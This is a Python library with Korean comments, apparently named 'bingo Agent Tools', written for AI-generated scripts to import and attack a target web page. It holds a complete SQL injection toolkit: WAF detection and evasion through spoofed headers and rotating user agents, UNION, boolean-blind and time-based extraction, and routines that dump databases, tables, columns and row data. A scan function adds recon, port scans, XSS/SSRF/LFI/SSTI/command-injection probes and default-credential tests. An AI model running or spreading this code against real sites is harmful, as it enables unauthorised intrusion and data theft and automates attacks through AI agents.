"""
bingo Agent Tools — AI 스크립트에서 import해서 바로 쓰는 빌트인 툴 라이브러리.
AI가 매번 기본 HTTP/SQLi 로직을 재작성하지 않아도 됨.

사용법 (AI 스크립트 맨 위에):
    import sys, os
    sys.path.insert(0, os.path.expanduser("~/.bingo"))
    from agent_tools import T
    t = T("https://target.com/page?id=1")

지원 인젝션 포인트:
    - GET 쿼리 파라미터 (기본)
    - POST body (T("url", post={"key":"val"}) 또는 t.set_post(...))
    - Cookie (T("url", cookie={"PHPSESSID":"..."}) 또는 t.set_cookie(...))

지원 DB 엔진:
    - MySQL / MariaDB (자동 감지)
    - PostgreSQL (자동 감지)
    - MSSQL (자동 감지)
    - SQLite (자동 감지)
"""
from __future__ import annotations
import re, time, random
from typing import Any
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

try:
    import httpx as _httpx
    _CLIENT = _httpx.Client(
        follow_redirects=True, verify=False, timeout=15,
        headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120"}
    )
except ImportError:
    _CLIENT = None  # type: ignore

# ── WAF 시그니처 ──────────────────────────────────────────────────
_WAF_SIGS = {
    "Cloudflare":  ["cf-ray", "_cf_chl", "cloudflare", "attention required"],
    "AWS WAF":     ["x-amzn-requestid", "aws-waf", "awswaf"],
    "ModSecurity": ["mod_security", "modsecurity", "naxsi"],
    "Wordfence":   ["wordfence", "x-fw-hash"],
    "Sucuri":      ["sucuri", "x-sucuri-id"],
    "Akamai":      ["akamai", "x-akamai"],
    "Imperva":     ["incapsula", "x-iinfo", "_incap_ses"],
    "F5 BIG-IP":   ["f5-bigip", "x-cnection", "bigipserver"],
    "Barracuda":   ["barracuda", "barra_counter_session"],
}

# ── SQL 에러 패턴 (DB별) ──────────────────────────────────────────
_SQL_ERRORS = {
    "MySQL":      [r"you have an error in your sql syntax", r"warning.*mysql",
                   r"supplied argument is not a valid mysql", r"mysql_fetch_array"],
    "PostgreSQL": [r"pg::syntaxerror", r"postgresql.*error", r"invalid input syntax",
                   r"syntax error at or near", r"pg_query\(\)"],
    "MSSQL":      [r"microsoft ole db", r"odbc microsoft access", r"unclosed quotation mark",
                   r"microsoft jet database", r"\[microsoft\]\[odbc sql server driver\]"],
    "Oracle":     [r"ora-\d{5}", r"oracle.*driver", r"quoted string not properly terminated"],
    "SQLite":     [r"sqlite_error", r"sqlite3::exception", r"near \".*\": syntax error"],
    "Generic":    [r"sql.*error", r"division by zero", r"syntax error"],
}
_ALL_SQL_ERRORS = [p for pats in _SQL_ERRORS.values() for p in pats]

# ── WAF 우회 헤더 세트 ────────────────────────────────────────────
_BYPASS_HEADERS = [
    {"X-Forwarded-For": "127.0.0.1", "X-Real-IP": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1", "X-Remote-IP": "127.0.0.1"},
    {"CF-Connecting-IP": "127.0.0.1"},
    {},
]

_UA_LIST = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36",
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
]


class T:
    """Bingo Agent Tool — 하나의 타겟 URL에 대한 모든 작업 처리.

    지원 인젝션:
      - GET 쿼리 파라미터 (기본)
      - POST body  →  post={"key": "val"} 또는 t.set_post(...)
      - Cookie     →  cookie={"PHPSESSID": "..."} 또는 t.set_cookie(...)
    """

    def __init__(
        self,
        target_url: str,
        param: str | None = None,
        post: dict | None = None,
        cookie: dict | None = None,
    ):
        self.target = target_url
        self.parsed = urlparse(target_url)
        self.qs = parse_qs(self.parsed.query, keep_blank_values=True)
        self.qs = {k.replace("amp;", ""): v for k, v in self.qs.items()}
        self.params = {k: v[0] for k, v in self.qs.items()}
        self.param = param or (list(self.params.keys())[0] if self.params else None)

        # POST / Cookie 지원
        self._post: dict | None = post
        self._cookie: dict | None = cookie
        self._inject_mode: str = "post" if post else "get"  # "get" | "post" | "cookie"

        # DB 엔진
        self.db_engine: str = "MySQL"  # 자동 감지 후 업데이트

        # 상태
        self.waf: str | None = None
        self._true_len: int = 0
        self._false_len: int = 0
        self._margin: int = 80

    def set_post(self, data: dict, param: str | None = None) -> "T":
        """POST 인젝션으로 전환."""
        self._post = data
        self._inject_mode = "post"
        if param:
            self.param = param
        elif not self.param:
            self.param = list(data.keys())[0] if data else None
        return self

    def set_cookie(self, data: dict, param: str | None = None) -> "T":
        """Cookie 인젝션으로 전환."""
        self._cookie = data
        self._inject_mode = "cookie"
        if param:
            self.param = param
        elif not self.param:
            self.param = list(data.keys())[0] if data else None
        return self

    # ── HTTP 기본 ─────────────────────────────────────────────────
    def get(self, url: str, extra_headers: dict | None = None, retries: int = 2,
            post_data: dict | None = None, cookie_data: dict | None = None) -> tuple[int, int, str]:
        """HTTP 요청. POST/Cookie 지원. (status, length, body) 반환."""
        if _CLIENT is None:
            raise ImportError("httpx not installed. Run: pip install httpx")
        hdrs: dict = {"User-Agent": random.choice(_UA_LIST)}
        if cookie_data:
            hdrs["Cookie"] = "; ".join(f"{k}={v}" for k, v in cookie_data.items())
        hdrs.update(extra_headers or {})
        for attempt in range(retries + 1):
            try:
                if post_data is not None:
                    r = _CLIENT.post(url, data=post_data, headers=hdrs)
                else:
                    r = _CLIENT.get(url, headers=hdrs)
                return r.status_code, len(r.text), r.text
            except Exception as e:
                if attempt == retries:
                    return 0, 0, f"[ERROR] {e}"
                time.sleep(1)
        return 0, 0, ""

    def inject(self, payload: str, param: str | None = None,
               extra_headers: dict | None = None) -> tuple[int, int, str]:
        """설정된 인젝션 모드(GET/POST/Cookie)로 페이로드 주입."""
        p = param or self.param
        if not p:
            return 0, 0, "[ERROR] no param"

        if self._inject_mode == "post" and self._post is not None:
            data = dict(self._post)
            data[p] = data.get(p, "") + payload
            return self.get(self.target, extra_headers, post_data=data)

        elif self._inject_mode == "cookie" and self._cookie is not None:
            ck = dict(self._cookie)
            ck[p] = ck.get(p, "") + payload
            return self.get(self.target, extra_headers, cookie_data=ck)

        else:  # GET
            qs = dict(self.qs)
            orig = qs.get(p, [""])[0]
            qs[p] = [orig + payload]
            url = urlunparse((
                self.parsed.scheme, self.parsed.netloc, self.parsed.path,
                self.parsed.params, urlencode(qs, doseq=True), ""
            ))
            return self.get(url, extra_headers)

    def inject_abs(self, payload: str, param: str | None = None,
                   extra_headers: dict | None = None) -> tuple[int, int, str]:
        """파라미터 값을 페이로드로 완전 교체."""
        p = param or self.param
        if not p:
            return 0, 0, "[ERROR] no param"

        if self._inject_mode == "post" and self._post is not None:
            data = dict(self._post)
            data[p] = payload
            return self.get(self.target, extra_headers, post_data=data)

        elif self._inject_mode == "cookie" and self._cookie is not None:
            ck = dict(self._cookie)
            ck[p] = payload
            return self.get(self.target, extra_headers, cookie_data=ck)

        else:
            qs = dict(self.qs)
            qs[p] = [payload]
            url = urlunparse((
                self.parsed.scheme, self.parsed.netloc, self.parsed.path,
                self.parsed.params, urlencode(qs, doseq=True), ""
            ))
            return self.get(url, extra_headers)

    # ── WAF 탐지 ─────────────────────────────────────────────────
    def detect_waf(self) -> str | None:
        """WAF 탐지. 이름 반환 (없으면 None)."""
        if _CLIENT is None:
            return None
        try:
            r = _CLIENT.get(self.target, headers={"User-Agent": random.choice(_UA_LIST)})
            hdr_str = str(r.headers).lower()
            body_head = r.text.lower()[:3000]
            for waf, sigs in _WAF_SIGS.items():
                for sig in sigs:
                    if sig in hdr_str or sig in body_head:
                        self.waf = waf
                        print(f"[WAF] {waf} detected (header/body)")
                        return waf
        except Exception:
            pass
        # 블로킹 프로브
        _, _, probe = self.inject("'")
        probe_l = probe.lower()[:3000]
        for waf, sigs in _WAF_SIGS.items():
            for sig in sigs:
                if sig in probe_l:
                    self.waf = waf
                    print(f"[WAF] {waf} detected (block probe)")
                    return waf
        print("[WAF] No WAF detected")
        return None

    def is_waf_blocked(self, body: str, status: int) -> bool:
        if status in (403, 406, 429, 503):
            return True
        body_l = body.lower()[:3000]
        block_sigs = ["cloudflare", "attention required", "blocked", "access denied",
                      "_cf_chl", "challenge-form", "turnstile", "sucuri", "wordfence block",
                      "incapsula", "request rejected", "illegal access"]
        return any(sig in body_l for sig in block_sigs)

    # ── DB 엔진 자동 감지 ─────────────────────────────────────────
    def detect_db_engine(self) -> str:
        """에러 기반으로 DB 엔진 자동 감지."""
        _, _, body = self.inject("'")
        body_l = body.lower()
        for engine, patterns in _SQL_ERRORS.items():
            if engine == "Generic":
                continue
            for pat in patterns:
                if re.search(pat, body_l):
                    self.db_engine = engine
                    print(f"[DB ENGINE] Detected: {engine}")
                    return engine
        print(f"[DB ENGINE] Defaulting to MySQL")
        return "MySQL"

    # ── SQL 에러 탐지 ─────────────────────────────────────────────
    def has_sql_error(self, body: str) -> str | None:
        body_l = body.lower()
        for pat in _ALL_SQL_ERRORS:
            m = re.search(pat, body_l)
            if m:
                return pat
        return None

    # ── UNION 기반 추출 ───────────────────────────────────────────
    def union_detect_columns(self, max_cols: int = 20) -> int:
        """UNION SELECT 컬럼 수 탐지. 성공한 컬럼 수 반환 (0=실패)."""
        print("[UNION] Detecting number of columns...")
        for n in range(1, max_cols + 1):
            nulls = ",".join(["NULL"] * n)
            payload = f" UNION SELECT {nulls}-- -"
            _, _, body = self.inject(payload)
            if not self.is_waf_blocked(body, 200) and not self.has_sql_error(body):
                # 에러 없이 응답 → 컬럼 수 맞음
                print(f"[UNION] Column count: {n}")
                return n
        return 0

    def union_find_printable(self, n_cols: int) -> int | None:
        """출력 가능한 컬럼 위치 탐지."""
        sentinel = "BINGO_UNION_TEST_9x7z"
        for pos in range(1, n_cols + 1):
            parts = ["NULL"] * n_cols
            parts[pos - 1] = f"'{sentinel}'"
            payload = f" UNION SELECT {','.join(parts)}-- -"
            _, _, body = self.inject(payload)
            if sentinel in body:
                print(f"[UNION] Printable column: {pos}")
                return pos
        return None

    def union_extract(self, sql_expr: str) -> str:
        """UNION으로 단일 SQL 표현식 추출. 실패 시 빈 문자열 반환."""
        n = self.union_detect_columns()
        if n == 0:
            return ""
        pos = self.union_find_printable(n)
        if pos is None:
            return ""
        parts = ["NULL"] * n
        parts[pos - 1] = f"({sql_expr})"
        payload = f" UNION SELECT {','.join(parts)}-- -"
        _, _, body = self.inject(payload)
        # 결과 추출
        m = re.search(r"BINGO_START(.+?)BINGO_END", body, re.DOTALL)
        if m:
            return m.group(1)
        # 마커 없이 그냥 body에서 추출 — 간단한 버전
        return ""

    def union_extract_marked(self, sql_expr: str) -> str:
        """마커 방식 UNION 추출: CONCAT('BINGO_START', expr, 'BINGO_END')."""
        n = self.union_detect_columns()
        if n == 0:
            return ""
        pos = self.union_find_printable(n)
        if pos is None:
            return ""
        parts = ["NULL"] * n
        parts[pos - 1] = f"CONCAT(0x42494e474f5f5354415254,({sql_expr}),0x42494e474f5f454e44)"
        payload = f" UNION SELECT {','.join(parts)}-- -"
        _, _, body = self.inject(payload)
        m = re.search(r"BINGO_START(.+?)BINGO_END", body, re.DOTALL)
        if m:
            val = m.group(1).strip()
            print(f"[UNION_MARKED] {sql_expr} = {val!r}")
            return val
        return ""

    # ── Boolean 기준값 설정 ───────────────────────────────────────
    def calibrate_boolean(self) -> bool:
        """TRUE/FALSE 기준 응답 길이 측정."""
        _, true_len, _ = self.inject(" AND 1=1-- -")
        time.sleep(0.3)
        _, false_len, _ = self.inject(" AND 1=2-- -")
        if true_len == 0 or false_len == 0:
            return False
        diff = abs(true_len - false_len)
        if diff < 50:
            print(f"[BOOL] No length difference (diff={diff}B) — may not be boolean injectable")
            return False

        if false_len > true_len:
            print(f"[BOOL] Logic inverted: false({false_len}) > true({true_len}) — swapping")
            true_len, false_len = false_len, true_len

        self._true_len = true_len
        self._false_len = false_len
        self._margin = max(60, diff // 3)
        print(f"[BOOL] Calibrated: true={true_len}B, false={false_len}B, diff={diff}B, margin={self._margin}B")
        return True

    def is_true_response(self, length: int) -> bool:
        if length <= 0:
            return False
        dist_true  = abs(length - self._true_len)
        dist_false = abs(length - self._false_len)
        return dist_true < dist_false and dist_true < self._margin

    # ── Boolean 추출 (WAF 우회 자동 적용) ────────────────────────
    def bool_extract_len(self, expr: str, max_len: int = 80) -> int:
        """Boolean으로 SQL 표현식의 정수값(또는 길이) 추출."""
        def make_variants(i: int) -> list[str]:
            return [
                f" AND {expr}={i}-- -",
                f" AND ({expr})={i}-- -",
                f" AND {i}=({expr})-- -",
                f"/**/AND/**/{expr}={i}-- -",
                f" AND {expr} BETWEEN {i} AND {i}-- -",
            ]

        for i in range(1, max_len + 1):
            for variant in make_variants(i):
                _, length, body = self.inject(variant)
                if self.is_waf_blocked(body, length):
                    continue
                if self.is_true_response(length):
                    return i
            time.sleep(0.1)
        return 0

    def bool_extract_char(self, expr: str, pos: int) -> str:
        """Boolean 이진탐색으로 SQL 표현식의 pos번째 문자 추출."""
        lo, hi = 32, 126
        char_exprs = [
            f"ASCII(MID(({expr}),{pos},1))",
            f"ORD(SUBSTR(({expr}),{pos},1))",
            f"ASCII(SUBSTRING(({expr}),{pos},1))",
        ]

        # 문자 존재 확인
        for ce in char_exprs:
            for v in [f" AND {ce}>0-- -", f"/**/AND/**/{ce}>0-- -"]:
                _, length, body = self.inject(v)
                if self.is_waf_blocked(body, length):
                    continue
                if not self.is_true_response(length):
                    return ""
                break
            break

        while lo <= hi:
            mid = (lo + hi) // 2
            found = False
            for ce in char_exprs:
                variants = [
                    f" AND {ce}>{mid}-- -",
                    f"/**/AND/**/{ce}>{mid}-- -",
                    f" AND ({ce})>{mid}-- -",
                    f" AND {ce} BETWEEN {mid+1} AND 126-- -",
                ]
                for v in variants:
                    _, length, body = self.inject(v)
                    if self.is_waf_blocked(body, length):
                        continue
                    if self.is_true_response(length):
                        lo = mid + 1
                    else:
                        hi = mid - 1
                    found = True
                    break
                if found:
                    break
            if not found:
                return "?"
            time.sleep(0.05)

        result_chr = lo
        if result_chr < 32 or result_chr > 126:
            return "?"
        return chr(result_chr)

    def bool_extract_string(self, expr: str, max_len: int = 80) -> str:
        """Boolean으로 SQL 문자열 표현식 전체 추출."""
        len_exprs = [
            f"LENGTH({expr})",
            f"CHAR_LENGTH({expr})",
            f"LEN/**/GTH({expr})",
            f"CHAR_LEN/**/GTH({expr})",
        ]
        slen = 0
        for le in len_exprs:
            slen = self.bool_extract_len(le, max_len)
            if slen > 0:
                break

        if slen == 0:
            print(f"[BOOL] Boolean length failed → time-based fallback: {expr}")
            slen = self.time_extract_len(expr, max_len)

        if slen == 0:
            return "[extraction_failed]"

        result = ""
        for pos in range(1, slen + 1):
            ch = self.bool_extract_char(expr, pos)
            result += ch
            print(f"[EXTRACT] [{pos}/{slen}] = {ch!r} → {result!r}")
        return result

    # ── 타임기반 (Boolean 완전 차단 시 폴백) ─────────────────────
    def time_extract_len(self, expr: str, max_len: int = 80, sleep_sec: float = 3.0) -> int:
        """Time-based으로 길이 추출."""
        print(f"[TIME] Extracting length of: {expr}")
        for le in [f"LENGTH({expr})", f"CHAR_LENGTH({expr})"]:
            for i in range(1, max_len + 1):
                payload = f" AND IF({le}={i},SLEEP({sleep_sec}),0)-- -"
                t0 = time.time()
                self.inject(payload)
                elapsed = time.time() - t0
                if elapsed >= sleep_sec * 0.8:
                    print(f"[TIME] Length={i} (elapsed={elapsed:.1f}s)")
                    return i
                time.sleep(0.1)
        return 0

    def time_extract_string(self, expr: str, max_len: int = 80, sleep_sec: float = 3.0) -> str:
        """Time-based으로 문자열 추출."""
        slen = self.time_extract_len(expr, max_len, sleep_sec)
        if slen == 0:
            return "[time_extraction_failed]"
        result = ""
        for pos in range(1, slen + 1):
            lo, hi = 32, 126
            while lo <= hi:
                mid = (lo + hi) // 2
                payload = f" AND IF(ASCII(MID(({expr}),{pos},1))>{mid},SLEEP({sleep_sec}),0)-- -"
                t0 = time.time()
                self.inject(payload)
                if time.time() - t0 >= sleep_sec * 0.8:
                    lo = mid + 1
                else:
                    hi = mid - 1
                time.sleep(0.05)
            result += chr(lo)
            print(f"[TIME_EXTRACT] [{pos}/{slen}] = {chr(lo)!r} → {result!r}")
        return result

    # ── 스마트 추출 (UNION → Boolean → Time 자동 선택) ────────────
    def smart_extract(self, sql_expr: str, max_len: int = 80) -> str:
        """가장 빠른 추출 방법 자동 선택: UNION > Boolean > Time."""
        # 1) UNION 시도
        print(f"[SMART] Trying UNION-based extraction...")
        val = self.union_extract_marked(sql_expr)
        if val and "[" not in val and val != "":
            print(f"[SMART] UNION succeeded: {val!r}")
            return val
        # 2) Boolean 시도
        print(f"[SMART] Trying boolean-based extraction...")
        val = self.bool_extract_string(sql_expr, max_len)
        if val and "failed" not in val:
            return val
        # 3) Time 폴백
        print(f"[SMART] Falling back to time-based extraction...")
        return self.time_extract_string(sql_expr, max_len)

    # ── DB 전체 덤프 ─────────────────────────────────────────────
    def dump_databases(self) -> list[str]:
        """DB 목록 추출 (스마트 방식)."""
        print("[DUMP] Extracting database list...")
        # UNION이면 한 번에 다 뽑기
        val = self.union_extract_marked(
            "SELECT GROUP_CONCAT(schema_name SEPARATOR ',') FROM information_schema.schemata"
        )
        if val and "," in val:
            dbs = [d.strip() for d in val.split(",") if d.strip()]
            print(f"[DUMP] Databases (UNION): {dbs}")
            return dbs

        # Boolean
        count_expr = "SELECT COUNT(*) FROM information_schema.schemata"
        count = self.bool_extract_len(f"({count_expr})", 30)
        if count == 0:
            count = 5

        dbs = []
        for i in range(count):
            expr = f"SELECT schema_name FROM information_schema.schemata LIMIT {i},1"
            db = self.bool_extract_string(f"({expr})")
            if db and "[" not in db:
                dbs.append(db)
                print(f"[DB] {i}: {db}")
        return dbs

    def dump_tables(self, db_name: str) -> list[str]:
        """특정 DB의 테이블 목록 추출."""
        print(f"[DUMP] Extracting tables from {db_name}...")
        hex_db = db_name.encode().hex()

        # UNION 시도
        val = self.union_extract_marked(
            f"SELECT GROUP_CONCAT(table_name ORDER BY table_name SEPARATOR ',') "
            f"FROM information_schema.tables WHERE table_schema=0x{hex_db}"
        )
        if val and val.strip():
            tables = [t.strip() for t in val.split(",") if t.strip()]
            print(f"[DUMP] Tables (UNION): {tables}")
            return tables

        # Boolean
        count_expr = f"SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=0x{hex_db}"
        count = self.bool_extract_len(f"({count_expr})", 100)
        if count == 0:
            return []

        tables = []
        for i in range(count):
            expr = (f"SELECT table_name FROM information_schema.tables "
                    f"WHERE table_schema=0x{hex_db} LIMIT {i},1")
            tbl = self.bool_extract_string(f"({expr})")
            if tbl and "[" not in tbl:
                tables.append(tbl)
                print(f"[TABLE] {i}: {tbl}")
        return tables

    def dump_columns(self, db_name: str, table_name: str) -> list[str]:
        """특정 테이블의 컬럼 목록 추출."""
        hex_db  = db_name.encode().hex()
        hex_tbl = table_name.encode().hex()

        # UNION 시도
        val = self.union_extract_marked(
            f"SELECT GROUP_CONCAT(column_name ORDER BY ordinal_position SEPARATOR ',') "
            f"FROM information_schema.columns "
            f"WHERE table_schema=0x{hex_db} AND table_name=0x{hex_tbl}"
        )
        if val and val.strip():
            cols = [c.strip() for c in val.split(",") if c.strip()]
            print(f"[DUMP] Columns (UNION): {cols}")
            return cols

        # Boolean
        count_expr = (
            f"SELECT COUNT(*) FROM information_schema.columns "
            f"WHERE table_schema=0x{hex_db} AND table_name=0x{hex_tbl}"
        )
        count = self.bool_extract_len(f"({count_expr})", 50)
        if count == 0:
            return []

        cols = []
        for i in range(count):
            expr = (
                f"SELECT column_name FROM information_schema.columns "
                f"WHERE table_schema=0x{hex_db} AND table_name=0x{hex_tbl} LIMIT {i},1"
            )
            col = self.bool_extract_string(f"({expr})")
            if col and "[" not in col:
                cols.append(col)
                print(f"[COL] {i}: {col}")
        return cols

    def dump_data(self, db_name: str, table_name: str, columns: list[str],
                  limit: int = 100) -> list[dict]:
        """테이블 데이터 추출 (기본 100행)."""
        rows = []
        hex_db  = db_name.encode().hex()
        hex_tbl = table_name.encode().hex()

        # UNION으로 전체 한 번에 (최대 20행)
        concat_cols = ",0x7c,".join(
            [f"IFNULL({c},'NULL')" for c in columns]
        )
        val = self.union_extract_marked(
            f"SELECT GROUP_CONCAT({concat_cols} SEPARATOR 0x0a) "
            f"FROM {db_name}.{table_name} LIMIT {min(limit, 20)}"
        )
        if val and val.strip():
            for line in val.split("\n"):
                parts = line.split("|")
                if len(parts) == len(columns):
                    row = {c: p.strip() for c, p in zip(columns, parts)}
                    rows.append(row)
                    print(f"[ROW] {row}")
            if rows:
                return rows

        # Boolean 폴백 (행별 컬럼별)
        for i in range(limit):
            row: dict[str, str] = {}
            for col in columns:
                expr = f"SELECT {col} FROM {db_name}.{table_name} LIMIT {i},1"
                val = self.bool_extract_string(f"({expr})", max_len=80)
                row[col] = val
            if any(v and "[" not in v for v in row.values()):
                rows.append(row)
                print(f"[ROW {i}] {row}")
            else:
                break  # 더 이상 데이터 없음
        return rows


def install_tools():
    """~/.bingo/ 에 모든 툴 모듈 복사 — AI 스크립트에서 import 가능하게 함."""
    import shutil, os
    from pathlib import Path
    tools_dir = Path(__file__).parent
    dst_dir = Path.home() / ".bingo"
    dst_dir.mkdir(exist_ok=True)

    for module in ["agent_tools.py", "recon_tools.py", "web_tools.py", "auth_tools.py"]:
        src = tools_dir / module
        if src.exists():
            shutil.copy2(src, dst_dir / module)
            print(f"[OK] {module} → {dst_dir / module}")
    print(f"[OK] All bingo tools installed in {dst_dir}")


# ── 전체 자동 스캔 ────────────────────────────────────────────────
def quick_scan(target_url: str, level: int = 2) -> dict:
    """
    bingo 풀 자동 스캔.

    level:
      1 = 빠른 정찰만 (기술 스택, 헤더, SSL)
      2 = 표준 (+ 포트 스캔, 웹 취약점) [기본]
      3 = 전체 (+ 서브도메인, 디렉터리 브루트)

    사용법:
        from agent_tools import quick_scan
        result = quick_scan("https://target.com/page?id=1")
    """
    import sys, os
    sys.path.insert(0, os.path.expanduser("~/.bingo"))

    report: dict = {"target": target_url, "level": level, "findings": {}}

    # 1) 정찰
    try:
        from recon_tools import Recon
        r = Recon(target_url)
        r.resolve_ip()
        r.fingerprint()
        r.analyze_headers()
        r.analyze_ssl()
        r.generate_dorks()
        if level >= 2:
            r.scan_ports()
        if level >= 3:
            r.enumerate_subdomains()
            r.dir_brute()
        report["findings"]["recon"] = r.findings
    except ImportError:
        print("[WARN] recon_tools not found — skipping recon")

    # 2) SQLi
    t = T(target_url)
    sqli_results = {"waf": t.detect_waf(), "injectable": False}
    if t.detect_db_engine():
        # UNION 시도
        db_name = t.union_extract_marked("database()")
        if db_name:
            sqli_results["injectable"] = True
            sqli_results["method"] = "UNION"
            sqli_results["database"] = db_name
        else:
            # Boolean 시도
            if t.calibrate_boolean():
                db_name = t.bool_extract_string("database()")
                sqli_results["injectable"] = True
                sqli_results["method"] = "Boolean Blind"
                sqli_results["database"] = db_name
    report["findings"]["sqli"] = sqli_results

    # 3) 웹 취약점
    if level >= 2:
        try:
            from web_tools import WebScanner
            ws = WebScanner(target_url)
            ws.scan_cors()
            ws.scan_open_redirect()
            if ws.params:
                ws.scan_xss()
                ws.scan_ssrf()
                ws.scan_lfi()
                ws.scan_ssti()
                ws.scan_cmdi()
            report["findings"]["web"] = ws.findings
        except ImportError:
            print("[WARN] web_tools not found — skipping web scan")

    # 4) 인증
    try:
        from auth_tools import Auth
        a = Auth(target_url)
        form = a.detect_login_form()
        if form:
            a.test_default_creds(form)
            a.analyze_session()
            report["findings"]["auth"] = a.findings
    except ImportError:
        print("[WARN] auth_tools not found — skipping auth scan")

    # 요약 출력
    _print_report(report)
    return report


def _print_report(report: dict) -> None:
    """스캔 결과 요약 출력."""
    print(f"\n{'='*60}")
    print(f"  BINGO SCAN REPORT — {report['target']}")
    print(f"{'='*60}")

    findings = report.get("findings", {})

    # Recon
    recon = findings.get("recon", {})
    if recon:
        print(f"\n📡 RECON")
        print(f"  IP:      {recon.get('ip', 'N/A')}")
        print(f"  Techs:   {', '.join(recon.get('technologies', []))}")
        print(f"  Ports:   {recon.get('open_ports', [])}")
        subs = recon.get("subdomains", [])
        if subs:
            print(f"  Subdomains ({len(subs)}): {', '.join(subs[:5])}")

    # SQLi
    sqli = findings.get("sqli", {})
    if sqli:
        print(f"\n💉 SQL INJECTION")
        if sqli.get("injectable"):
            print(f"  🔴 VULNERABLE — Method: {sqli.get('method')}")
            print(f"  Database: {sqli.get('database', 'N/A')}")
        else:
            print(f"  ✅ Not injectable (or not detected)")
        if sqli.get("waf"):
            print(f"  WAF: {sqli['waf']}")

    # Web vulns
    web = findings.get("web", [])
    if web:
        print(f"\n🌐 WEB VULNERABILITIES ({len(web)} found)")
        for f in web:
            icon = {"CRITICAL": "🔴", "HIGH": "🟠", "MEDIUM": "🟡", "LOW": "🔵"}.get(f["severity"], "⚪")
            print(f"  {icon} {f['type']}: {f['detail'][:80]}")

    # Auth
    auth = findings.get("auth", [])
    if auth:
        print(f"\n🔑 AUTH ISSUES ({len(auth)} found)")
        for f in auth:
            icon = {"CRITICAL": "🔴", "HIGH": "🟠", "MEDIUM": "🟡", "LOW": "🔵"}.get(f["severity"], "⚪")
            print(f"  {icon} {f['type']}: {f['detail'][:80]}")

    print(f"\n{'='*60}\n")


if __name__ == "__main__":
    install_tools()
